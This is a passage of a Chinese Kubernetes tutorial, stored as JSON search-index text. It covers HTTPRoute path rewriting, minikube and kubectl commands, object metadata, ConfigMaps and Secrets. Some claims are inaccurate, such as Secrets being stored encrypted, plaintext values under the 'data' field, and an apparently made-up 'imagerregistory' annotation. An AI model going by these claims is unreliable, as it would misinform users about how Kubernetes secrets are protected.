\u6ce8\u610f\uff0c\u73b0\u5728\u5c3d\u7ba1\u8bf7\u6c42\u80fd\u88ab\u8f6c\u53d1\uff0c\u4f46\u662f\u8def\u5f84\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002 /producer/apple \u88ab\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\uff0c\u4f46\u662f\u8def\u5f84\u4ecd\u7136\u662f /producer/apple \u3002\u5982\u679c\u6211\u4eec\u5e0c\u671b\u8def\u5f84\u53d1\u751f\u53d8\u5316\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 rewrite \u3002 apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: router spec: parentRefs: - name: gateway rules: - matches: - path: type: PathPrefix value: /producer backendRefs: - name: producer-service port: 3001 filters: - type: URLRewrite urlRewrite: path: type: ReplacePrefixMatch replacePrefixMatch: \"\" - matches: - path: type: PathPrefix value: /consumer backendRefs: - name: consumer-service port: 3002 filters: - type: URLRewrite urlRewrite: path: type: ReplacePrefixMatch replacePrefixMatch: \"\" filters \u53ef\u4ee5\u7528\u4e8e\u4fee\u6539\u8bf7\u6c42\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e86 URLRewrite\uff0c\u7528\u4e8e\u91cd\u5199 URL\u3002path \u6a21\u5f0f\u53ef\u4ee5\u4f7f\u7528ReplacePrefixMatch\uff0c\u6765\u66ff\u6362\u524d\u7f00\u3002\u8fd9\u91cc\u6211\u4eec\u628a\u5339\u914d\u7684 prefix \u5220\u9664\uff0c\u5373\u5220\u9664 /producer \u548c /consumer \uff0c\u8fd9\u6837\uff0c\u6211\u4eec\u7684\u8bf7\u6c42\u5c31\u4f1a\u88ab\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\uff0c\u800c\u8def\u5f84\u4e5f\u6b63\u5e38\u4e86\u3002 \u5f53\u7136\uff0cfilter \u4e0d\u6b62\u6709\u8fd9\u4e9b\u529f\u80fd\u3002\u5982\u679c\u8fd9\u4e9b\u529f\u80fd\u4e0d\u591f\u7528\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49 filter\u3002filter \u662f\u4e00\u4e2a Envoy \u7684\u914d\u7f6e\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7 filter \u6765\u4fee\u6539\u8bf7\u6c42\u7684\u5185\u5bb9\u3002filter \u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u4e00\u79cd\u662f HTTPFilter \uff0c\u4e00\u79cd\u662f NetworkFilter \u3002\u524d\u8005\u662f\u7528\u4e8e HTTP \u8bf7\u6c42\u7684\uff0c\u540e\u8005\u662f\u7528\u4e8e TCP \u8bf7\u6c42\u7684\u3002\u4e0d\u8fc7\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u3002","title":"\u8def\u5f84\u5339\u914d\u4e0e\u91cd\u5199"},{"location":"21/#_5","text":"\u524d\u9762\u6211\u4eec\u53ea\u662f\u7b80\u5355\u5730\u4f7f\u7528\u4e86 k8s \u7684\u547d\u4ee4\u884c\u5de5\u5177 kubectl \u548c minikube\u3002\u73b0\u5728\u6211\u4eec\u7cfb\u7edf\u5730\u603b\u7ed3\u4e00\u4e0b k8s \u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002","title":"\u547d\u4ee4\u884c\u5de5\u5177"},{"location":"21/#minikube","text":"minikube start \u542f\u52a8 minikube \u96c6\u7fa4\u3002 minikube stop \u505c\u6b62 minikube \u96c6\u7fa4\u3002 minikube delete \u5220\u9664 minikube \u96c6\u7fa4\u3002 minikube dashboard \u6253\u5f00 minikube \u7684 dashboard\u3002 minikube service <service-name> \u6253\u5f00\u670d\u52a1\u7684 UI\u3002 minikube ip \u83b7\u53d6 minikube \u7684 IP \u5730\u5740\u3002 minikube ssh SSH \u5230 minikube \u96c6\u7fa4\u3002 minikube tunnel \u521b\u5efa\u4e00\u4e2a\u96a7\u9053\uff0c\u7528\u4e8e\u8bbf\u95ee minikube \u96c6\u7fa4\u4e2d LoadBalancer \u7684\u670d\u52a1\u3002","title":"minikube"},{"location":"21/#kubectl","text":"kubectl get <resource> \u83b7\u5f97\u8d44\u6e90\u5217\u8868\u3002resource \u6211\u4eec\u76ee\u524d\u4ecb\u7ecd\u8fc7\u7684\u6709 Pod\uff0cService\uff0cReplicaSet\uff0cDeployment\uff0cGateway\uff0cHTTPRoute\u3002\u8fd9\u91cc resource \u53ef\u4ee5\u7b80\u5199\uff0c\u4f8b\u5982 pod \u53ef\u4ee5\u7b80\u5199\u4e3a po\uff0cservice \u53ef\u4ee5\u7b80\u5199\u4e3a svc\uff0cdeployment \u53ef\u4ee5\u7b80\u5199\u4e3a deploy\u3002\u6b64\u5916\uff0cresource \u8fd8\u6709 event\uff0cnode\uff0cnamespace\u3002 kubectl describe <resource> <resource-name> \u63cf\u8ff0\u8d44\u6e90\u3002\u53ef\u4ee5\u83b7\u5f97\u8d44\u6e90\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 kubectl apply -f <file> \u5e94\u7528\u914d\u7f6e\u6587\u4ef6\u3002\u53ef\u4ee5\u5e94\u7528\u914d\u7f6e\u6587\u4ef6\uff0c\u4f8b\u5982 kubectl apply -f pod.yaml \u3002 kubectl exec -it <pod-name> -- /bin/bash \u8fdb\u5165 Pod \u7684 shell\u3002 kubectl logs <pod-name> \u67e5\u770b Pod \u7684\u65e5\u5fd7\u3002 kubectl port-forward <pod-name> <local-port>:<pod-port> \u5c06 Pod \u7684\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u7aef\u53e3\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6620\u5c04\u7684\u662f Pod \u7684\u7aef\u53e3\uff0c\u800c\u4e0d\u662f Service \u7684\u7aef\u53e3\u3002 kubectl delete <resource> <resource-name> \u5220\u9664\u8d44\u6e90\u3002 kubectl edit <resource> <resource-name> \u7f16\u8f91\u8d44\u6e90\u3002 kubectl config <command> \u914d\u7f6e kubectl\u3002\u4f8b\u5982 kubectl config get-contexts \u53ef\u4ee5\u67e5\u770b\u6240\u6709\u7684 context\u3002 kubectl config use-context <context> \u53ef\u4ee5\u5207\u6362 context\u3002 kubectl config current-context \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684 context\u3002Context \u5373 k8s \u7684\u8fd0\u884c\u65f6\u3002 --all-namespaces \u9009\u9879\uff0c\u53ef\u4ee5\u67e5\u770b\u6240\u6709\u7684 namespace\u3002 --namespace <namespace> \u9009\u9879\uff0c\u53ef\u4ee5\u6307\u5b9a namespace\u3002 kubectl expose deployment <deployment-name> \u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06 Deployment \u66b4\u9732\u4e3a Service\u3002\u4f8b\u5982 kubectl expose deployment producer --type=LoadBalancer --port=3001 --target-port=3001 \u3002\u8fd9\u6837\u672c\u8d28\u4e0a\u662f\u521b\u5efa\u4e86\u4e00\u4e2a Service\uff0c\u5c06 Service \u7684 3001 \u7aef\u53e3\u6620\u5c04\u5230 Deployment \u7684 3001 \u7aef\u53e3\u3002 kubectl scale deployment <deployment-name> --replicas=<replicas> \u547d\u4ee4\uff0c\u53ef\u4ee5\u6269\u5c55 Deployment \u7684\u526f\u672c\u6570\u91cf\u3002\u4f8b\u5982 kubectl scale deployment producer --replicas=3 \u3002\u5176\u5b9e\u5c31\u662f\u4fee\u6539\u4e86\u914d\u7f6e\u6587\u4ef6\u3002 kubectl annotate <resource> <resource-name> <key>=<value> \u547d\u4ee4\uff0c\u53ef\u4ee5\u7ed9\u8d44\u6e90\u6dfb\u52a0\u6ce8\u89e3\u3002\u4f8b\u5982 kubectl annotate pod producer app=producer \u3002 kubectl label <resource> <resource-name> <key>=<value> \u547d\u4ee4\uff0c\u53ef\u4ee5\u7ed9\u8d44\u6e90\u6dfb\u52a0\u6807\u7b7e\u3002\u4f8b\u5982 kubectl label pod producer app=producer \u3002 kubectl rollout <command> \u547d\u4ee4\uff0c\u53ef\u4ee5\u7ba1\u7406 Deployment \u7684\u6eda\u52a8\u66f4\u65b0\u3002\u4f8b\u5982 kubectl rollout status deployment producer \u53ef\u4ee5\u67e5\u770b Deployment \u7684\u66f4\u65b0\u72b6\u6001\u3002 kubectl rollout history deployment producer \u53ef\u4ee5\u67e5\u770b Deployment \u7684\u66f4\u65b0\u5386\u53f2\u3002 kubectl rollout undo deployment producer \u53ef\u4ee5\u56de\u6eda Deployment\u3002 kubectl rollout restart deployment producer \u53ef\u4ee5\u91cd\u542f Deployment\u3002 kubectl port-forward <pod-name> <local-port>:<pod-port> \u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06 Pod \u7684\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u7aef\u53e3\u3002\u4f8b\u5982 kubectl port-forward producer-7d7b7d4b7b-7z7z7 3001:3001 \u3002","title":"kubectl"},{"location":"22/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch22 k8s \u65e0\u72b6\u6001\u670d\u52a1 \u524d\u9762\u6211\u4eec\u5df2\u7ecf\u4ece\u5b9e\u8df5\u7684\u89d2\u5ea6\u8bb2\u89e3\u4e86 k8s \u7684\u65e0\u72b6\u6001\u670d\u52a1\u7684\u57fa\u672c\u90e8\u7f72\uff0c\u4ee5\u53ca\u5982\u4f55\u6253\u5305\u5e94\u7528\uff0c\u5982\u4f55\u914d\u7f6e\u7f51\u5173\u3002\u8fd9\u4e00\u8282\uff0c\u6211\u4eec\u4f1a\u4ecb\u7ecd k8s \u4e2d\u7684\u65e0\u72b6\u6001\u670d\u52a1\u7684\u751f\u4ea7\u7ea7\u90e8\u7f72\u3002 k8s \u4e2d\uff0c\u670d\u52a1\u53ef\u4ee5\u6839\u636e\u5176\u662f\u5426\u6709\u72b6\u6001\uff0c\u5373\u662f\u5426\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u5206\u4e3a\u65e0\u72b6\u6001\u670d\u52a1\u548c\u6709\u72b6\u6001\u670d\u52a1\u3002\u65e0\u72b6\u6001\u670d\u52a1\u662f\u6307\u670d\u52a1\u4e0d\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\uff0c\u800c\u6709\u72b6\u6001\u670d\u52a1\u5219\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u4e0d\u80fd\u968f\u65f6\u91cd\u542f\u3002\u65e0\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u76f8\u5bf9\u7b80\u5355\uff0c\u56e0\u4e3a\u65e0\u72b6\u6001\u670d\u52a1\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\uff0c\u800c\u6709\u72b6\u6001\u670d\u52a1\u5219\u9700\u8981\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\u3002 k8s \u5bf9\u8c61 \u524d\u9762\u6211\u4eec\u4e00\u76f4\u5728\u7f16\u5199\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u5176\u5b9e\u662f k8s \u5bf9\u8c61\u7684\u5b9a\u4e49\u3002k8s \u4e2d\u6709\u5f88\u591a\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u4f5c\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u6765\u5b9a\u4e49\u8fd9\u4e9b\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7 k8s \u7684 API \u6765\u521b\u5efa\u8fd9\u4e9b\u5bf9\u8c61\u3002 \u8981\u67e5\u770b\u76ee\u524d\u5df2\u7ecf\u6ce8\u518c\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\uff0c kubectl api-resources \u5fc5\u987b\u5b57\u6bb5 \u4e00\u4e2a k8s \u5bf9\u8c61\u5305\u542b\uff0c API \u7248\u672c\uff0c apiVersion \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684 API \u7248\u672c\u3002 \u7c7b\u578b\uff0c kind \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684\u7c7b\u578b\u3002 \u5143\u6570\u636e\uff0c metadata \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684\u5143\u6570\u636e\uff0c\u4f8b\u5982\u540d\u79f0\u3001\u6807\u7b7e\u7b49\u3002 \u89c4\u8303\uff0c\u901a\u5e38\u662f spec \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684\u89c4\u8303\uff0c\u4f8b\u5982\u5bb9\u5668\u7684\u955c\u50cf\u3001\u7aef\u53e3\u7b49\u3002 \u8fd9\u4e9b\u5b57\u6bb5\u662f k8s \u5bf9\u8c61\u7684\u57fa\u672c\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u8fd9\u4e9b\u5b57\u6bb5\u3002 \u5bf9\u8c61\u5143\u6570\u636e \u4e4b\u524d\u6211\u4eec\u5728\u4f7f\u7528 Service \u65f6\u53d1\u73b0\uff0cService \u662f\u4e00\u4e2a\u8d1f\u8f7d\u5747\u8861\u5230\u8fbe\u82e5\u5e72 Pod \u8bf7\u6c42\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u9700\u8981\u9009\u4e2d\u4e00\u4e9b Pod\u3002\u5f53\u65f6\u6211\u4eec\u4f7f\u7528\u7684\u662f\uff0c selector: app: producer \u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u5728\u521b\u5efa deployment \u65f6\uff0c\u4e3a pod \u6307\u5b9a\u7684\u6a21\u7248\u4e3a\uff0c metadata: labels: app: producer \u8fd9\u5c31\u662f\u4e00\u4e2a\u9009\u62e9\u5668\uff0cService \u4f1a\u6839\u636e\u8fd9\u4e2a\u9009\u62e9\u5668\u9009\u62e9\u5bf9\u5e94\u7684 Pod\u3002\u8fd9\u91cc\u7684 label \u5c31\u662f\u5bf9\u8c61\u7684\u5143\u6570\u636e\u3002 k8s \u4e2d\uff0c\u9996\u5148\u6309\u547d\u540d\u7a7a\u95f4\u5212\u5206\u903b\u8f91\u96c6\u7fa4\u3002\u6bcf\u4e2a\u903b\u8f91\u96c6\u7fa4\u5305\u542b\u82e5\u5e72\u5bf9\u8c61\u3002\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684 UID\u3002\u540c\u65f6\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u8fd8\u53ef\u4ee5\u5e26\u6709 metadata\uff0c\u5305\u62ec\u540d\u79f0\u3001\u547d\u540d\u7a7a\u95f4\u3001\u6807\u7b7e\u3001\u6ce8\u89e3\u3002 \u540d\u79f0\u901a\u5e38\u662f\u7528\u6237\u4e3a\u4e86\u65b9\u4fbf\u6307\u5b9a\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u4e0e UID \u529f\u80fd\u76f8\u540c\uff0c\u4f46\u662f UID \u662f k8s \u81ea\u52a8\u751f\u6210\u7684\uff0c\u540d\u79f0\u662f\u7528\u6237\u6307\u5b9a\u7684\u3002\u8fd9\u662f metadata \u7684 name \u5b57\u6bb5\u3002 labels \u662f\u4e00\u4e2a\u5b57\u5178\uff0c\u5305\u542b\u4e86\u4e00\u4e9b\u952e\u503c\u5bf9\u3002\u8fd9\u4e9b\u952e\u503c\u5bf9\u53ef\u4ee5\u7528\u6765\u9009\u62e9\u5bf9\u8c61\u3002\u4f8b\u5982\uff0cService \u4f1a\u6839\u636e selector \u9009\u62e9\u5bf9\u5e94\u7684 Pod\u3002\u8fd9\u662f metadata \u7684 labels \u5b57\u6bb5\u3002\u5e38\u7528\u7684\u4e00\u4e2a\u4f8b\u5b50\u662f app: producer \uff0c\u8868\u793a\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4e00\u4e2a producer \u670d\u52a1\u3002\u6b64\u5916\uff0c\u6709\u7684\u670d\u52a1\u7f51\u683c\uff08\u540e\u9762\u4f1a\u4ecb\u7ecd\uff09\u4f1a\u6839\u636e version: v1 \u9009\u62e9\u5bf9\u5e94\u7684\u7248\u672c\u3002 \u5982\u679c\u9700\u8981\u4e3a\u5bf9\u8c61\u6307\u660e\u547d\u540d\u7a7a\u95f4\uff0c\u53ef\u4ee5\u4f7f\u7528 metadata \u7684 namespace \u5b57\u6bb5\u3002\u5982\u679c\u4e0d\u6307\u5b9a\uff0c\u90a3\u4e48\u9ed8\u8ba4\u4e3a default \u547d\u540d\u7a7a\u95f4\u3002 \u6ce8\u89e3\u6211\u4eec\u4e4b\u524d\u6ca1\u6709\u4f7f\u7528\u8fc7\uff0c\u5b83\u662f metadata \u7684 annotations \u5b57\u6bb5\u3002\u6ce8\u89e3\u662f\u4e00\u4e9b\u952e\u503c\u5bf9\u3002\u4e0e labels \u4e0d\u540c\uff0c\u6ce8\u89e3\u4e0d\u662f\u5355\u7eaf\u7684\u6807\u8bb0\uff0c\u800c\u662f\u6709\u529f\u80fd\u7684\uff0c\u4f8b\u5982\uff0c\u53ef\u4ee5\u901a\u8fc7 imagerregistory \u6ce8\u89e3\u6307\u5b9a Pod \u955c\u50cf\u7684\u4ed3\u5e93\u3002 \u65e0\u72b6\u6001\u670d\u52a1\u5bf9\u8c61 \u9996\u5148\u6211\u4eec\u4ecb\u7ecd\u9700\u8981\u4f7f\u7528\u5230\u7684\u5bf9\u8c61\uff0c\u524d\u9762\u4ecb\u7ecd\u5230\u7684\u4f1a\u4e00\u7b14\u5e26\u8fc7\u3002 Pod Pod \u662f k8s \u7684\u6700\u5c0f\u90e8\u7f72\u5355\u5143\uff0c\u662f\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u7684\u96c6\u5408\u3002Pod \u4e2d\u7684\u5bb9\u5668\u5171\u4eab\u7f51\u7edc\u548c\u5b58\u50a8\uff0c\u53ef\u4ee5\u901a\u8fc7 localhost \u76f4\u63a5\u901a\u4fe1\u3002Pod \u662f\u65e0\u72b6\u6001\u670d\u52a1\u7684\u57fa\u672c\u90e8\u7f72\u5355\u5143\u3002 ReplicaSet ReplicaSet \u662f Pod \u7684\u63a7\u5236\u5668\uff0c\u7528\u4e8e\u4fdd\u8bc1 Pod \u7684\u6570\u91cf\u3002ReplicaSet \u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 Pod \u6a21\u677f\uff0c\u4fdd\u8bc1 Pod \u7684\u6570\u91cf\u3002\u5982\u679c Pod \u6302\u6389\uff0cReplicaSet \u4f1a\u81ea\u52a8\u91cd\u542f Pod\u3002 Deployment Deployment \u662f ReplicaSet \u7684\u63a7\u5236\u5668\uff0c\u7528\u4e8e\u4fdd\u8bc1 ReplicaSet \u7684\u6570\u91cf\u3002Deployment \u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 ReplicaSet \u6a21\u677f\uff0c\u4fdd\u8bc1 ReplicaSet \u7684\u6570\u91cf\u3002\u5982\u679c ReplicaSet \u6302\u6389\uff0cDeployment \u4f1a\u81ea\u52a8\u91cd\u542f ReplicaSet\u3002 \u56e0\u6b64\uff0cDeployment \u53ea\u80fd\u7528\u4e8e\u90e8\u7f72\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u56e0\u4e3a\u65e0\u72b6\u6001\u670d\u52a1\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\u3002\u5982\u679c\u670d\u52a1\u6709\u72b6\u6001\uff0c\u90a3\u4e48\u91cd\u542f\u540e\u6570\u636e\u4f1a\u4e22\u5931\u3002 Deployment \u53ef\u4ee5\u6307\u5b9a Resources\uff0c\u4f8b\u5982 CPU \u548c\u5185\u5b58\u3002 resources: requests: memory: \"64Mi\" cpu: \"250m\" limits: memory: \"128Mi\" cpu: \"500m\" \u8fd9\u91cc m \u8868\u793a milli\uff0c\u5373 1/1000\uff0cCPU \u7684\u5355\u4f4d\u662f\u6838\u5fc3\u6570\u3002 requests \u8868\u793a\u8bf7\u6c42\u7684\u8d44\u6e90\uff0c limits \u8868\u793a\u9650\u5236\u7684\u8d44\u6e90\u3002 Service Service \u662f Pod \u7684\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u7528\u4e8e\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230 Pod\u3002Service \u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 Pod Selector\uff0c\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684 Pod\u3002Service \u6709\u56db\u79cd\u7c7b\u578b\uff0c\u5206\u522b\u662f ClusterIP\uff0cNodePort\uff0cLoadBalancer \u548c ExternalName\u3002 ConfigMap \u524d\u9762\u6211\u4eec\u4f7f\u7528 helm \u6a21\u7248\u5b9e\u73b0\u4e86\u7528\u6237\u81ea\u5b9a\u4e49\uff0c\u4f46\u662f\u5982\u6b64\u64cd\u4f5c\uff0c\u6bcf\u6b21\u90fd\u9700\u8981\u91cd\u65b0\u90e8\u7f72\u3002ConfigMap \u53ef\u4ee5\u5c06\u914d\u7f6e\u6587\u4ef6\u72ec\u7acb\u51fa\u6765\uff0c\u7136\u540e\u6302\u8f7d\u5230 Pod \u4e2d\u3002\u8fd9\u6837\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 ConfigMap \u6765\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u800c\u4e0d\u9700\u8981\u91cd\u65b0\u90e8\u7f72 Deployment\u3002 ConfigMap \u6709\u4e00\u4e2a\u989d\u5916\u7684\u5b57\u6bb5\uff0c data \uff0c\u7528\u4e8e\u5b58\u653e\u914d\u7f6e\u4fe1\u606f\u3002 apiVersion: v1 kind: ConfigMap metadata: name: username-password-config data: username: admin password: admin \u8fd9\u91cc\u7684 data \u5c31\u662f\u666e\u901a\u7684 yaml\uff0c\u53ef\u4ee5\u5b58\u653e\u4efb\u610f\u914d\u7f6e\u4fe1\u606f\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u786e\u5b9a\u4f60\u7684 ConfigMap \u4e0d\u4f1a\u5728\u91cd\u65b0\u90e8\u7f72\u524d\u6539\u53d8\uff0c\u53ef\u4ee5\u4f7f\u7528 immutable \u5b57\u6bb5\u6765\u6307\u5b9a ConfigMap \u662f\u4e0d\u53ef\u53d8\u7684\u3002 # ... metadata: name: username-password-config # ... immutable: true \u5982\u679c\u8981\u8ba9 Pod \u8bfb\u53d6\u5230 ConfigMap\uff0c\u5e38\u7528\u7684\u662f\u4ee5\u4e0b\u4e24\u79cd\u65b9\u6cd5\u3002 \u5c06 ConfigMap \u4f5c\u4e3a\u6587\u4ef6 Pod \u672c\u8eab\u5c31\u662f Docker \u5bb9\u5668\uff0c\u800c Docker \u5bb9\u5668\u6709 Volume\uff0c\u7528\u4e8e\u6302\u8f7d\u5916\u90e8\u6587\u4ef6\u3002ConfigMap \u81ea\u8eab\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\uff0c\u88ab\u6302\u8f7d\u5230 Pod \u4e2d\u3002 apiVersion: v1 kind: Pod metadata: name: producer spec: containers: - name: producer image: producer volumeMounts: - name: username-password-volume mountPath: \"/conf\" readOnly: true volumes: - name: username-password-volume configMap: name: username-password-config \u5728\u4e0a\u9762\u7684 Pod \u914d\u7f6e\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u5728 volumes \u4e2d\u5c06 ConfigMap \u5b9a\u4e49\u6210\u4e86\u4e00\u4e2a Volume\u3002\u7136\u540e\u5728 containers \u4e2d\u5c06\u8fd9\u4e2a Volume \u6302\u8f7d\u5230\u4e86 /conf \u8def\u5f84\u3002 \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8bfb\u53d6 /conf \u8def\u5f84\u4e0b\u7684\u6587\u4ef6\uff0c\u5373 ConfigMap\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 Javascript\u3002 import * as fs from 'fs'; const username = fs.readFileSync('/conf/username', 'utf8'); const password = fs.readFileSync('/conf/password', 'utf8'); \u6ce8\u610f\uff0c\u5728\u9664\u4e86\u73af\u5883\u53d8\u91cf\u6a21\u5f0f\u4ee5\u5916\u7684\u6a21\u5f0f\u4e0b\uff0cConfigMap \u66f4\u65b0\u65f6\uff0c\u5176\u88ab\u6620\u5c04\u7684\u5185\u5bb9\uff08\u4f8b\u5982\u8fd9\u91cc\u7684\u6587\u4ef6\uff09\uff0c\u4f1a\u88ab\u4e00\u5e76\u5237\u65b0\u3002\u4f46\u662f\uff0c\u7a0b\u5e8f\u9700\u8981\u91cd\u65b0\u8bfb\u53d6\u624d\u80fd\u83b7\u53d6\u5230\u65b0\u7684\u5185\u5bb9\u3002 \u5c06 ConfigMap \u4f5c\u4e3a\u73af\u5883\u53d8\u91cf \u4f7f\u7528\u4ee5\u4e0b\u7684\u914d\u7f6e\u65b9\u5f0f\u6765\u628a ConfigMap \u52a0\u8f7d\u6210\u73af\u5883\u53d8\u91cf\uff0c apiVersion: v1 kind: Pod metadata: name: producer spec: containers: - name: producer image: producer env: - name: CONFIG_MAP_USERNAME valueFrom: configMapKeyRef: name: username-password-config key: username - name: CONFIG_MAP_PASSWORD valueFrom: configMapKeyRef: name: username-password-config key: password \u4f46\u662f\uff0c\u6ce8\u610f\uff0cPod \u4e2d\u73af\u5883\u53d8\u91cf\u540d\u79f0\u5141\u8bb8\u7684\u5b57\u7b26\u8303\u56f4\u662f\u6709\u9650\u7684\u3002\u5982\u679c\u67d0\u4e9b\u53d8\u91cf\u540d\u79f0\u4e0d\u6ee1\u8db3\u8fd9\u4e9b\u89c4\u5219\uff0c\u5219\u5373\u4f7f Pod \u53ef\u4ee5\u88ab\u542f\u52a8\uff0c\u4f60\u7684\u5bb9\u5668\u4e5f\u65e0\u6cd5\u8bbf\u95ee\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u3002 Secret \u5982\u679c\u4f60\u6709\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982\u5bc6\u7801\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f\u7528 Secret \u6765\u5b58\u50a8\u8fd9\u4e9b\u4fe1\u606f\u3002Secret \u4e0e ConfigMap \u7c7b\u4f3c\uff0c\u4f46\u662f Secret \u4f1a\u88ab\u52a0\u5bc6\u5b58\u50a8\u3002 Secret \u4e5f\u6709 data \u5b57\u6bb5\uff0c\u4e0e ConfigMap \u884c\u4e3a\u57fa\u672c\u4e00\u81f4\u3002 apiVersion: v1 kind: Secret metadata: name: password-secret type: Opaque data: password: password \u8fd9\u91cc type \u5b57\u6bb5\u662f Opaque\uff0c\u5373\u7528\u6237\u81ea\u5b9a\u4e49\u52a0\u5bc6\u65b9\u5f0f\u3002type \u8fd8\u6709\u8bb8\u591a\u7c7b\u578b\uff0c\u6709\u4e0d\u540c\u7684\u52a0\u5bc6\u65b9\u5f0f\uff0c\u5177\u4f53\u53ef\u4ee5 \u67e5\u770b\u6587\u6863 \u3002 \u6ce8\u610f\uff0ck8s \u53ea\u662f\u5c06 Secret \u52a0\u5bc6\u5b58\u50a8\uff0c\u800c\u4e0d\u662f\u52a0\u5bc6\u4f20\u8f93\u3002\u5373\u8fd9\u91cc\u6211\u4eec\u7684\u6587\u4ef6\u91cc\u5199\u7684\u662f\u660e\u6587\u5bc6\u7801\uff0c\u4f46\u662f k8s \u4f1a\u5c06\u5176\u52a0\u5bc6\u5b58\u50a8\u3002\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u660e\u6587\u5bc6\u7801\u51fa\u73b0\u5728\u6587\u4ef6\u4e2d\uff0c\u624b\u52a8\u8fdb\u884c\u5bf9\u79f0\u6216\u975e\u5bf9\u79f0\u52a0\u5bc6\uff0c\u7136\u540e\u5c06\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u5b58\u50a8\u5728 Secret \u4e2d\uff0c\u516c\u94a5\u516c\u5f00\u5728 ConfigMap\uff0c\u79c1\u94a5\u88ab\u5bf9\u5e94\u7684 Pod \u6301\u6709\u3002 \u5982\u679c\u8981\u52a0\u8f7d Secret\uff0c\u628a\u4e0a\u6587\u4e2d ConfigMap \u7684\u5bf9\u8c61\u540d\u6539\u4e3a Secret \u5373\u53ef\uff0c\u4f8b\u5982\uff0c apiVersion: v1 kind: Pod metadata: name: secret-dotfiles-pod spec: volumes: - name: secret-volume secret: secretName: dotfile-secret containers: - name: dotfile-test-container image: registry.k8s.io/busybox command: - ls - \"-l\" - \"/etc/secret-volume\" volumeMounts: - name: secret-volume readOnly: true mountPath: \"/etc/secret-volume\" \u6ce8\u610f\uff0cSecret \u5bf9\u6240\u6709\u6302\u8f7d\u7684\u5bb9\u5668\u90fd\u662f\u660e\u6587\u7684\u3002\u5982\u679c\u9700\u8981\u66f4\u5b89\u5168\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u624b\u52a8\u5b9e\u73b0\u975e\u5bf9\u79f0\u52a0\u5bc6\uff0c\u5e76\u628a\u79c1\u94a5\u50a8\u5b58\u5728\u552f\u4e00\u5141\u8bb8\u8bbf\u95ee\u7684 Pod \u4e2d\u3002 HorizontalPodAutoscaler \u524d\u9762\u6211\u4eec\u5df2\u7ecf\u5b9e\u73b0\u4e86\u670d\u52a1\u7684\u90e8\u7f72\u3002\u4f46\u662f\uff0c\u4f7f\u7528 Deployment \u53ea\u80fd\u7ed9\u5b9a\u4e00\u4e2a Pod 